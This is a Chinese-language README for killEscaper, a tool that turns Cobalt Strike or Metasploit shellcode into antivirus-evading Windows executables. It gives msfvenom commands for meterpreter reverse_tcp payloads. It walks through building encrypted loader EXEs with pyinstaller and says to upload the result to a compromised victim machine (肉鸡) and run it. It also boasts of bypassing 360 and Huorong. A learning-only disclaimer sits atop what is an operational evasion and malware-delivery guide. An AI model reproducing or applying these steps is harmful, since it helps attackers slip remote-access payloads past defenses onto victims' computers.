# killEscaper Shellcode免杀生成器(Windows)
![](http://cdn.anyiblog.top/product/killescaper/cover/logo.png)

Github项目： https://github.com/Anyyy111/killEscaper

声明：本工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。

## 0x01 介绍

作者: Anyyy

博客: https://www.anyiblog.top

本文地址：https://www.anyiblog.top/2023/06/08/20230608/

killEscaper 是一个利用shellcode来制作免杀exe的工具，可结合渗透工具生成的shellcode二次转换exe，支持红队常用渗透工具CobaltStrike、metasploit等，测试可以绕过火绒、360等杀软，操作系统位数支持32、64位。

当前处于测试阶段，任何问题欢迎向我发送邮件：anyiguys@qq.com 或向我提交issue

工具**仅支持Windows 且python版本需为python3.x**



## 0x02 安装

项目拉取：

```
git clone https://github.com/Anyyy111/killEscaper
```

模块安装：

脚本调用的模块都是原生库，注意安装 **pyinstaller** 即可。

```
pip install pyinstaller
```

并添加 **pyinstaller** 至系统环境变量。



## 0x03 使用方法

```python
_    _ _ _ _____
| | _(_) | | ____|___  ___ __ _ _ __   ___ _ __
| |/ / | | |  _| / __|/ __/ _` | '_ \ / _ \ '__|
|   <| | | | |___\__ \ (_| (_| | |_) |  __/ |
|_|\_\_|_|_|_____|___/\___\__,_| .__/ \___|_|
                               |_|
    @Title: killEscaper_ShellCode免杀生成器
    @Author: Anyyy
    @Blog: https://www.anyiblog.top/
    @env：Windows系统、Python3


usage: python killEscaper.py -a <32/64> -f <ShellCode File> -i <Icon file>

使用说明：

optional arguments:
  -h, --help            show this help message and exit
  -a ARCH, --arch ARCH  shellcode对应的操作系统位数 默认为64位
  -f FILE, --file FILE  任何包含shellcode的Payload文件 用于读取并生成
  -i ICON, --icon ICON  exe的Icon图标
  -c, --clean           清理output输出文件
```



- -f (--file)  **必要参数**，**指定任何包含shellcode的Payload文件，用于读取并生成**
- -a (--arch)  可选参数，**shellcode对应的操作系统位数 默认为64位**
- -i (--icon)  可选参数，**生成的exe的Icon图标**，程序默认图标为exeLogo.ico
- -c (--clean) **清理output输出文件**，程序每次运行会在output生成exe文件，使用该参数可以直接清理



### 使用案例

根据shellcode生成64位的exe执行文件：

```python
python killescaper -f payload64.c #根据shellcode生成64位的exe执行文件
```

根据shellcode生成32位的exe执行文件：

```python
python killescaper -a 32 -f payload32.c #根据shellcode生成32位的exe执行文件
```

自定义图标：

```python
python killescaper -a 64 -f payload64.c -i logo.ico #生成一个以logo.ico为图标的exe执行文件
```

清理输出文件夹：

```python
python killescaper --clean #清理output/所有文件
```



### metasploit生成免杀

只讲生成免杀的步骤，执行及如何返回监听请查看 **0x04 效果演示** 的视频。



1.msfvenom生成shellcode

x64:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x64 > shellcode.txt
```

x32:

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f python -a x86 > shellcode.txt
```

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608161915527.png)

2.将shellcode.txt复制到本地

3.运行脚本生成exe

```
python killEscaper.py -a 64 -f shellcode.txt
```

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162208863.png)

4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162330573.png)

5.上传到肉鸡运行



### CobaltStrike生成免杀

只讲生成免杀的步骤，执行及如何返回监听请查看 **0x04 效果演示** 的视频。



1.cs生成shellcode

x64:

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162606208.png)

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162614396.png)



x32:

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162606208.png)

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162648687.png)

output输出C、python都行。

2.点击Generate到本地payload64.c

3.运行脚本生成exe

```
python killEscaper.py -a 64 -f payload64.c
```

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162208863.png)

4.运行成功后会复制到剪贴板，粘贴或在/output/文件夹找到可执行文件

![](http://cdn.anyiblog.top/product/killescaper/imgs/image-20230608162330573.png)

5.上传到肉鸡运行



## 0x04 效果演示

CobaltStrike免杀上线：

视频地址： **http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_cs.mp4**

<video src="http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_cs.mp4" controls="controls" width=100% height=auto></video>



Kali msf免杀上线：

视频地址： **http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_msf.mp4**

<video src="http://cdn.anyiblog.top/product/killescaper/video/killEscaper%E6%BC%94%E7%A4%BA_msf.mp4" controls="controls" width=100% height=auto></video>



virustotal分析指数：

![](http://cdn.anyiblog.top/product/killescaper/imgs/QQ%E6%88%AA%E5%9B%BE20230608160113.png)



## 0x05 原理

程序会将shellcode进行加密，会生成cipher密文和key密钥，密文和密钥每次生成都不同。

模板中定义了解密模块，需要对应的密文密钥才能解密，再将解密后的Payload执行，即执行恶意shellcode返回至监听的cs或msf。

模板写好后再写到python文件中，利用pyinstaller打包成exe，算法绕过了杀软的检测 同时执行shellcode，便成功实现了免杀执行。

算法部分参考免杀工具 **BypassAV** 的算法并进行了优化。

## 0x06 存活日志

免杀这个东西，用的人越多越容易失效，主要是开源给大家学习下。

我打算每次更新的时候就更新下日志，等到失效那一天hhh

师傅们点点Star支持下~~

```
2023.06.08 —— 360、火绒绕过。
```



